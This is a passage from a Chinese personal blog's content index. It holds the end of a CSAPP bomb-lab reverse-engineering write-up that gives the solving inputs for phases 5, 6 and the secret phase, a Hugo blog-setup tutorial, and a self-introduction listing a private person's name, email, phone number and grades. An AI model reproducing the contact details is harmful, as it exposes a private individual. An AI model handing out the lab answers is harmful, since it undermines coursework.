25 28 00 xor %fs:0x28,%rax //rax与%fs段寄存器中偏移地址为0x28的内容异或来检查内容是否被修改 4010e5:\t00 00 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; //如果相等，则跳转到0x4010ee 4010e9:\te8 42 fa ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; //否则调用错误处理历程 4010ee:\t48 83 c4 20 add $0x20,%rsp //出栈，栈指针增加32 4010f2:\t5b pop %rbx 4010f3:\tc3 ret 关键代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //从(rax+rbx)处读取的1字节数据零扩展到ecx中 ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //将cl的值存入rsp所指的地址中(rcx的低8位) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //从(rdx+0x4024b0)处读取的1字节数据零扩展到edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //将dl(edx的低8位)存入((rax+rsp)+16)地址中 *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //比较rax和6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //若rax!=6，则跳转到0x40108b 这部分的循环相当于以下C程序： for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } 就是要使得所输入的字符串的十六进制取后四位，并作为array数组的下标，让array数组与目标字符串相等。\n目标字符串在0x40245e内存地址中，即0x666c79657273 \u0026ldquo;flyers\u0026rdquo;\narray数组在0x4024b0内存地址中,如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 (gdb) x/16c 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;: 109 \u0026#39;m\u0026#39; 97 \u0026#39;a\u0026#39; 100 \u0026#39;d\u0026#39; 117 \u0026#39;u\u0026#39; 105 \u0026#39;i\u0026#39; 101 \u0026#39;e\u0026#39; 114 \u0026#39;r\u0026#39; 115 \u0026#39;s\u0026#39; 0x4024b8 \u0026lt;array.3449+8\u0026gt;: 110 \u0026#39;n\u0026#39; 102 \u0026#39;f\u0026#39; 111 \u0026#39;o\u0026#39; 116 \u0026#39;t\u0026#39; 118 \u0026#39;v\u0026#39; 98 \u0026#39;b\u0026#39; 121 \u0026#39;y\u0026#39; 108 \u0026#39;l\u0026#39; (gdb) x/s 0x40245e 0x40245e: \u0026#34;flyers\u0026#34; 0x4024b9 f 0x4024bf l 0x4024be y 0x4024b5 e 0x4024b6 r 0x4024b7 s array数组的表格如下\narray[i]的i 对应的char input[rax] 0 m 0x*0 1 a 0x*1 2 d 0x*2 3 u 0x*3 4 i 0x*4 5 e 0x*5 6 r 0x*6 7 s 0x*7 8 n 0x*8 9 f 0x*9 a o 0x*a b t 0x*b c v 0x*c d b 0x*d e y 0x*e f l 0x*f 所以输入的字符串只需找到表格中对应flyers字符串的input[rax]任意组合即可，比如ionefg(0x69 0x6f 0x6e 0x65 0x66 0x67)\nPhase_6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 00000000004010f4 \u0026lt;phase_6\u0026gt;: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp //入栈，栈指针减少80 401100:\t49 89 e5 mov %rsp,%r13 //r13=rsp 401103:\t48 89 e6 mov %rsp,%rsi //rsi=rsp 401106:\te8 51 03 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; //读取6个数字 40110b:\t49 89 e6 mov %rsp,%r14 //r14=rsp 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d //r12d=0 401114:\t4c 89 ed mov %r13,%rbp //rbp=r13 rsp rsp+4 401117:\t41 8b 45 00 mov 0x0(%r13),%eax //eax=*(r13) 40111b:\t83 e8 01 sub $0x1,%eax //eax=eax-1 40111e:\t83 f8 05 cmp $0x5,%eax //eax与5比较 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; //若eax\u0026lt;=5，跳转到0x401128 401123:\te8 12 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401128:\t41 83 c4 01 add $0x1,%r12d //r12d=r12d+1=1 2 40112c:\t41 83 fc 06 cmp $0x6,%r12d //r12d与6比较 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; //若r12d=6，则跳转到0x401153 401132:\t44 89 e3 mov %r12d,%ebx //ebx=r12d=1 2 401135:\t48 63 c3 movslq %ebx,%rax //rax=ebx 1 2 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax //eax=*(rsp+rax*4) 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; //若*(rbp)!=*(rsp+rax*4),跳转到0x401145 401140:\te8 f5 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401145:\t83 c3 01 add $0x1,%ebx //ebx++ 2 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; //若ebx\u0026lt;=5,跳转到0x401135 40114d:\t49 83 c5 04 add $0x4,%r13 //r13+=4 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; //跳转到0x401114 #这段代码的目的就是让所有参数要小于等于6，并且不得重复 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi //rsi=rsp+24 401158:\t4c 89 f0 mov %r14,%rax //rax=r14 rsp 40115b:\tb9 07 00 00 00 mov $0x7,%ecx //ecx=7 401160:\t89 ca mov %ecx,%edx //edx=ecx=7 401162:\t2b 10 sub (%rax),%edx //edx=edx-*(rax) 7-*(rsp) 401164:\t89 10 mov %edx,(%rax) //*(rax)=edx *(rsp)=7-*(rsp) 401166:\t48 83 c0 04 add $0x4,%rax //rax=rax+4 rsp+4 40116a:\t48 39 f0 cmp %rsi,%rax //rax与rsi比较 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; //若rax!=rsi，则跳转到0x401160 六次循环 #这段代码就是处理参数 #相当于for(int i=0;i\u0026lt;6;i++){ #input[i]=7-input[i]; #} 40116f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 401174:\teb 21 jmp 401197 \u0026lt;phase_6+0xa3\u0026gt; //跳转到0x401197 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx //rdx=*(rdx+8) *(0x6032d0+8) 40117a:\t83 c0 01 add $0x1,%eax //eax++ 2 40117d:\t39 c8 cmp %ecx,%eax //比较ecx和eax的大小 *(rsp)与2大小 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; //若ecx!=eax，则跳转到0x401176 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; //跳转到0x401188 401183:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) //*(rsp+rsi*2+32)=rdx 40118d:\t48 83 c6 04 add $0x4,%rsi //rsi=rsi+4 4 401191:\t48 83 fe 18 cmp $0x18,%rsi //rsi与24比较 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; //若rsi=24，跳转到0x4011ab 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx //ecx=*(rsp+rsi) 指针偏移，依次获取6个数 *(rsp) *(rsp+4) 40119a:\t83 f9 01 cmp $0x1,%ecx //比较ecx与1的大小 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; //若ecx\u0026lt;=1，跳转到0x401183 即当处理后的*(rsp)=1时 40119f:\tb8 01 00 00 00 mov $0x1,%eax //eax=1 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; //跳转到0x401176 #这段代码不太好着手，根据我们输入的1 2 3 4 5 6带入运行，经过之前的处理后编程了6 5 4 3 2 1， #这段代码的关键在于0x6032d0这个地址代表的含义， #在处理第一个参数6时，发现在不断嵌套使用地址，优点像链表，利用gdb查看，这个地址的值发现： #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032f0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x00603300 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x00603310 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603320 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 #在这里，我的输入是1 2 3 4 5 6 #我们看到打印出来的结果，每个node里第2个四字节的部分和我们的输入吻合； #而第三个四字节的部分则是下一个node的起始地址，最后一个四字节的部分则为0， #考虑到内存对齐，我们大概能推测出，这应该是一个链表，而我们的输入的数字与在第二个四字节的地方的数据有关， #第一个四字节的内容表示的是什么待确定 # 这个结构体有点类似链表： # struct { # int sth; // 某四字节内容 # int input; // 与我们的输入有关 # node* next; // 下一个node地址 # } node; #这么看下来这段代码就是将处理后参数所对应node的起始地址存储到首地址为rsp+0x20，尾地址为rsp+0x50的地方 #(gdb) x/12w $rsp+0x20 #0x7fffffffd8c0: 0x00603320 0x00000000 0x00603310 0x00000000 #0x7fffffffd8d0: 0x00603300 0x00000000 0x006032f0 0x00000000 #0x7fffffffd8e0: 0x006032e0 0x00000000 0x006032d0 0x00000000 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx //rbx=*(rsp+0x20) 0x00603320 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax //rax=(rsp+0x28) 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi //rsi=(rsp+0x50) 4011ba:\t48 89 d9 mov %rbx,%rcx //rcx=rbx=*(rsp+0x20) 0x00603320 4011bd:\t48 8b 10 mov (%rax),%rdx //rdx=*(rax)=*(rsp+0x28) 0x00603310 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) //*(rcx+8)=rdx *(*(rsp+0x20)+8)=*(rsp+0x28) //*0x00603328=0x00603310 *0x00603318=0x603300 4011c4:\t48 83 c0 08 add $0x8,%rax //rax+=8 (rsp+0x30) 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt; //若rax=rsi,跳转到0x4011d2 4011cd:\t48 89 d1 mov %rdx,%rcx //rcx=rdx *(rsp+0x28) 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; //跳转到0x4011bd #这段代码可以简化为一个for循环，这个循环用来将链表的结点重新调整至第一个参数的结点为头节点， #后面的参数依次链接在这个头结点后的链表： #for(int i=0;i\u0026lt;6;i++){ #node[i]-\u0026gt;next=node[i+1]; #} #结果如下 #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032d0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x006032e0 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x006032f0 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603300 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00603310 0x00000000 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) ///*(rdx+8)=0 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp //ebp=5 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax //rax=*(rbx+8)=头结点的下一个结点rbx=*(rsp+0x20) 4011e3:\t8b 00 mov (%rax),%eax //eax=*(rax) 下一结点的sth内容 4011e5:\t39 03 cmp %eax,(%rbx) //当前结点的sth与下一结点的sth内容比较 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; //若*(rbx)\u0026gt;=eax，则跳转到0x4011ee 4011e9:\te8 4c 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx //rbx=*(rbx+8) 指向下一个结点 4011f2:\t83 ed 01 sub $0x1,%ebp //ebp-- 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; //若不等于0，则跳转到0x4011df 4011f7:\t48 83 c4 50 add $0x50,%rsp //出栈，栈指针增加80 #这段代码主要是比较每个结点和下一个结点的sth值(结点的首四字节内容)，当前结点的sth要大于等于下一结点的sth， #所以我们需要将sth的值排序从大到小排序,排序后所结点对应序号的序列就是我们要输入的参数值和对应顺序， #即4 3 2 1 6 5 注意参数被处理过，不要写成3 4 5 6 1 2 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 ret 注释中一般都只写了第一次循环各寄存器所对应的值，若有多个值则是循环了多次，一般循环两三次就能看出整个函数的用意。整个phase_6调试所输入的参数为1 2 3 4 5 6\nBonus 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 00000000004015c4 \u0026lt;phase_defused\u0026gt;: 4015c4:\t48 83 ec 78 sub $0x78,%rsp 4015c8:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf:\t00 00 4015d1:\t48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6:\t31 c0 xor %eax,%eax 4015d8:\t83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u0026lt;num_input_strings\u0026gt; 4015df:\t75 5e jne 40163f \u0026lt;phase_defused+0x7b\u0026gt; 4015e1:\t4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0:\tbe 19 26 40 00 mov $0x402619,%esi #地址的值是\u0026#34;%d %d %s\u0026#34; 4015f5:\tbf 70 38 60 00 mov $0x603870,%edi #地址的值是\u0026#34;7 0\u0026#34;这正是第4关的key，推测从这关进入彩蛋 4015fa:\te8 f1 f5 ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 4015ff:\t83 f8 03 cmp $0x3,%eax 401602:\t75 31 jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #eax!=3，就跳转到末尾 401604:\tbe 22 26 40 00 mov $0x402622,%esi #esi=0x402622 该地址对应\u0026#34;DrEvil\u0026#34; 401609:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi #rdi=*(rsp+16) 40160e:\te8 25 fd ff ff call 401338 \u0026lt;strings_not_equal\u0026gt; #判断字符串是否相等 401613:\t85 c0 test %eax,%eax 401615:\t75 1e jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #如果不等，就跳转到末尾 401617:\tbf f8 24 40 00 mov $0x4024f8,%edi 40161c:\te8 ef f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 401621:\tbf 20 25 40 00 mov $0x402520,%edi 401626:\te8 e5 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40162b:\tb8 00 00 00 00 mov $0x0,%eax 401630:\te8 0d fc ff ff call 401242 \u0026lt;secret_phase\u0026gt; #因此进入彩蛋需要在第4关的答案后面添上\u0026#34;DrEvil\u0026#34;字符串 401635:\tbf 58 25 40 00 mov $0x402558,%edi 40163a:\te8 d1 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40163f:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 401644:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b:\t00 00 40164d:\t74 05 je 401654 \u0026lt;phase_defused+0x90\u0026gt; 40164f:\te8 dc f4 ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 401654:\t48 83 c4 78 add $0x78,%rsp 401658:\tc3 ret 0000000000401204 \u0026lt;fun7\u0026gt;: 401204:\t48 83 ec 08 sub $0x8,%rsp 401208:\t48 85 ff test %rdi,%rdi 40120b:\t74 2b je 401238 \u0026lt;fun7+0x34\u0026gt; #若rdi=0，则跳转 40120d:\t8b 17 mov (%rdi),%edx #edx=*(rdi)=0x24 40120f:\t39 f2 cmp %esi,%edx 401211:\t7e 0d jle 401220 \u0026lt;fun7+0x1c\u0026gt; #若edx\u0026lt;=esi，则跳转 401213:\t48 8b 7f 08 mov 0x8(%rdi),%rdi #rdi=*(rdi+8) 401217:\te8 e8 ff ff ff call 401204 \u0026lt;fun7\u0026gt; func7(0x00603110,input) 40121c:\t01 c0 add %eax,%eax 40121e:\teb 1d jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401220:\tb8 00 00 00 00 mov $0x0,%eax #eax=0 401225:\t39 f2 cmp %esi,%edx 401227:\t74 14 je 40123d \u0026lt;fun7+0x39\u0026gt; #若edx=esi，则跳转 input不能等于0x24 401229:\t48 8b 7f 10 mov 0x10(%rdi),%rdi #rdi=*(rdi+16) 40122d:\te8 d2 ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401232:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax #eax=rax+rax+1 401236:\teb 05 jmp 40123d \u0026lt;fun7+0x39\u0026gt; #跳转 401238:\tb8 ff ff ff ff mov $0xffffffff,%eax 40123d:\t48 83 c4 08 add $0x8,%rsp 401241:\tc3 ret #等价c语言： int fun7(int input, Node* addr){ if(addr == 0){ return -1; } int v = addr-\u0026gt;value; if (v == input){ return 0; }else if( v \u0026lt; input){ return 1 + 2*fun7(input, addr-\u0026gt;right); }else{ return 2*func7(input, addr-\u0026gt;left); } } #纵观eax值的设置，一共有三处，esi\u0026lt;edx时，eax=2*eax； esi=edx时，eax=0；esi\u0026gt;edx时，eax=rax+rax+1，在它们的前面还会嵌套调用func7 #若想让eax=2，那么只有让最深层的func7调用eax=0，然后调用eax=rax+rax+1，最后最外面这层func7函数调用eax=2*eax，这样刚好等于2 #所以input\u0026lt;0x24 input\u0026gt;0x8 input=0x16 #这里的设置与phase_6的设置有些类似，涉及到了地址嵌套调用，使用gdb查看相应的内存地址范围的值，一目了然。 #(gdb) x/120w 0x6030f0 #0x6030f0 \u0026lt;n1\u0026gt;: 0x00000024 0x00000000 0x00603110 0x00000000 #0x603100 \u0026lt;n1+16\u0026gt;: 0x00603130 0x00000000 0x00000000 0x00000000 #0x603110 \u0026lt;n21\u0026gt;: 0x00000008 0x00000000 0x00603190 0x00000000 #0x603120 \u0026lt;n21+16\u0026gt;: 0x00603150 0x00000000 0x00000000 0x00000000 #0x603130 \u0026lt;n22\u0026gt;: 0x00000032 0x00000000 0x00603170 0x00000000 #0x603140 \u0026lt;n22+16\u0026gt;: 0x006031b0 0x00000000 0x00000000 0x00000000 #0x603150 \u0026lt;n32\u0026gt;: 0x00000016 0x00000000 0x00603270 0x00000000 #0x603160 \u0026lt;n32+16\u0026gt;: 0x00603230 0x00000000 0x00000000 0x00000000 #0x603170 \u0026lt;n33\u0026gt;: 0x0000002d 0x00000000 0x006031d0 0x00000000 #0x603180 \u0026lt;n33+16\u0026gt;: 0x00603290 0x00000000 0x00000000 0x00000000 #0x603190 \u0026lt;n31\u0026gt;: 0x00000006 0x00000000 0x006031f0 0x00000000 #0x6031a0 \u0026lt;n31+16\u0026gt;: 0x00603250 0x00000000 0x00000000 0x00000000 #0x6031b0 \u0026lt;n34\u0026gt;: 0x0000006b 0x00000000 0x00603210 0x00000000 #0x6031c0 \u0026lt;n34+16\u0026gt;: 0x006032b0 0x00000000 0x00000000 0x00000000 #0x6031d0 \u0026lt;n45\u0026gt;: 0x00000028 0x00000000 0x00000000 0x00000000 #0x6031e0 \u0026lt;n45+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6031f0 \u0026lt;n41\u0026gt;: 0x00000001 0x00000000 0x00000000 0x00000000 #0x603200 \u0026lt;n41+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603210 \u0026lt;n47\u0026gt;: 0x00000063 0x00000000 0x00000000 0x00000000 #0x603220 \u0026lt;n47+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603230 \u0026lt;n44\u0026gt;: 0x00000023 0x00000000 0x00000000 0x00000000 #0x603240 \u0026lt;n44+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603250 \u0026lt;n42\u0026gt;: 0x00000007 0x00000000 0x00000000 0x00000000 #0x603260 \u0026lt;n42+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603270 \u0026lt;n43\u0026gt;: 0x00000014 0x00000000 0x00000000 0x00000000 #0x603280 \u0026lt;n43+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603290 \u0026lt;n46\u0026gt;: 0x0000002f 0x00000000 0x00000000 0x00000000 #0x6032a0 \u0026lt;n46+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6032b0 \u0026lt;n48\u0026gt;: 0x000003e9 0x00000000 0x00000000 0x00000000 #0x6032c0 \u0026lt;n48+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 0000000000401242 \u0026lt;secret_phase\u0026gt;: 401242:\t53 push %rbx 401243:\te8 56 02 00 00 call 40149e \u0026lt;read_line\u0026gt; 401248:\tba 0a 00 00 00 mov $0xa,%edx #edx=10 第三个参数 40124d:\tbe 00 00 00 00 mov $0x0,%esi #esi=0 第二个参数 401252:\t48 89 c7 mov %rax,%rdi #rdi=rax 第一个参数 401255:\te8 76 f9 ff ff call 400bd0 \u0026lt;strtol@plt\u0026gt; #将字符串转为长整型 40125a:\t48 89 c3 mov %rax,%rbx #rbx=rax 40125d:\t8d 40 ff lea -0x1(%rax),%eax #eax=rax-1 401260:\t3d e8 03 00 00 cmp $0x3e8,%eax #eax与1000比较 401265:\t76 05 jbe 40126c \u0026lt;secret_phase+0x2a\u0026gt; #若eax\u0026lt;=1000,则跳转到0x40126c 401267:\te8 ce 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #否则，爆炸 40126c:\t89 de mov %ebx,%esi #esi=ebx 第二个参数为转化后的长整型数字 40126e:\tbf f0 30 60 00 mov $0x6030f0,%edi #edi=0x6930f0 第一个参数 401273:\te8 8c ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401278:\t83 f8 02 cmp $0x2,%eax #比较eax和2 40127b:\t74 05 je 401282 \u0026lt;secret_phase+0x40\u0026gt; #若eax=2，跳转到0x401282,所以func7函数返回值必须要等于2 40127d:\te8 b8 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #否则，爆炸 401282:\tbf 38 24 40 00 mov $0x402438,%edi #edi=0x402438 401287:\te8 84 f8 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40128c:\te8 33 03 00 00 call 4015c4 \u0026lt;phase_defused\u0026gt; 401291:\t5b pop %rbx 注意：彩蛋要在输入6个关卡的答案后才会出现。\n","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/1_hu16866174452783611002.jpg","permalink":"https://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/","title":"CSAPP:bomb实验"},{"content":"Hugo介绍 Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。\nHugo中文文档地址： https://www.gohugo.org\nHugo安装 下载地址：https://github.com/gohugoio/hugo/releases\n找到对应系统的下载文件(win10为例，建议选择extended版本，有些主题需要extended版本才能正常使用)\n建立blog文件夹，并将下载好的zip文件解压到该文件夹下(建议不要有中文和空格)\n再将hogu.exe的路径添加到环境变量中(不会则请STFW)\n在cmd中查看命令是否成功\n1 2 3 4 5 输入下面命令查看是否成功 $ hugo version 输出结果： Hugo Static Site Generator v0.68.3/extended windows/amd64 BuildDate: unknown 说明安装成功 设置站点\n1 hugo new site myBlog 生成myblog文件夹\nHugo主题下载 官方网址：https://www.gohugo.org/theme/\n建议安装方法：\n将下载好的主题解压放入myblog文件夹下的themes下\n并在myblog/config.toml里加一行 theme=xxxx（解压后的主题文件夹的名称）\n把exampleSite的文件复制放到myblog文件夹下\n启动站点\n1 hugo server 请注意倒数第二行（ Web Server is available at //localhost:1313/ (bind address 127.0.0.1) ）说明启动成功了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Building sites … WARN 2020/04/07 17:51:51 Markup type mmark is deprecated and will be removed in a future release. See https://gohugo.io//content-management/formats/#list-of-content-formats | EN -------------------+----- Pages | 74 Paginator pages | 0 Non-page files | 21 Static files | 8 Processed images | 28 Aliases | 14 Sitemaps | 1 Cleaned | 0 Built in 1103 ms Watching for changes in F:\\blog\\myBlog\\{archetypes,content,data,layouts,static,themes} Watching for config changes in F:\\blog\\myBlog\\config.toml, F:\\blog\\myBlog\\config\\_default Environment: \u0026#34;development\u0026#34; Serving pages from memory Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender Web Server is available at //localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop 在浏览器中输入 localhost:1313，就可以看到效果了\n注意事项：如果启动站点失败，可以先将主题删除，再启动站点，看是否报错，若没报错则是主题配置问题。\n创建文章 创建第一篇文章，放到 post 目录，方便之后生成聚合页面。(注意命名时不可以空格，可以用-代替)\n1 hugo post/first.md 然后就可以使用 hugo server 来查看效果啦！\n(注意：如果没出现新文章，则可能开启了draft模式，使用hogu server -D)\n部署到服务器 我们将使用github.io来代替服务器以及域名：推荐参考教程\n几个注意事项：\nGit要上传或执行的文件可以在文件夹中，右键空白地区点git bash here从而实现目录内操作。 在linux操作中（比如git）粘贴操作是shift+insert或单击鼠标的滚轮。而复制只要选中即可。 github的域名地址与用户名必须一致，比如你的github名字叫sakura，那么域名必须是sakura.github.io。 hugo命令 hugo --baseUrl=\u0026quot;https://你的github名字.github.io/\u0026quot;执行完后，会生成一个public文件夹。 用git推送的时候 git pull --rebase origin master语句可能会出错显示没有文件，不用担心，这是因为此时目标仓库是空的，直接下一步最后，你只需要输入对应网址，即可看到博客了！ 如果想将默认语言设置为中文，只要在config中设置一下defaultContentLanguage=\u0026ldquo;zh-cn\u0026quot;就行了，但可能会不生效，最好将其放在config.toml的第一行 更新博客 在博客目录下使用 hugo \u0026ndash;baseUrl=\u0026ldquo;https://你的github名字.github.io/\u0026ldquo;覆盖原来的public文件夹\n进入public文件夹右键git bash 分别执行\n1 2 3 git add . git commit -m ‘first commit’ git push 可能存在的问题：\ngithub上存放文件的仓库是否只有一个分支（创建时不要勾选生成README.md) 正常public上传github仓库后会只有一个分支，且包含了public内的所有文件 文章看不到,检查是否格式正确，使用了hugo new xxxx.md,检查是否包含了 draft: true，若有则删除或使用 hugo server -D，若草稿模式开启是看不到文章的 git push不成功,此时大概率是网络通信有问题，可以关掉git终端后科学上网；重启git 终端后（windows需要，linux系统不需要）再进行push大概率就可以解决问题了；此时无需再进行git init 等初始化操作因为之前已经做完。 ","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/matt-le-SJSpo9hQf7s-unsplash_hu10664154974910995856.jpg","permalink":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","title":"个人博客搭建"},{"content":"自我介绍 **基本信息：** 李俊/ 男/ 21\u0026emsp;\u0026emsp;\u0026emsp;\u0026emsp;\u0026emsp;\u0026emsp;**现\u0026ensp;在\u0026ensp;地：** 湖南岳阳 邮 箱： 1321352582@qq.com 手 机 号： 18007304397\n证 书： 英语六级、普通话二乙、计算机三级 GitHub： https://github.com/chenyuan1125\n教育背景 湖南理工学院 2019.09-2023.06 计算机科学与技术专业\n主修课程：计算机网络原理(94)、计算机系统结构(90)、数据库原理(92)、计算机组成原理、操作系统、数据结构、编译原理 平均绩点：3.49/4 专业排名：3/61 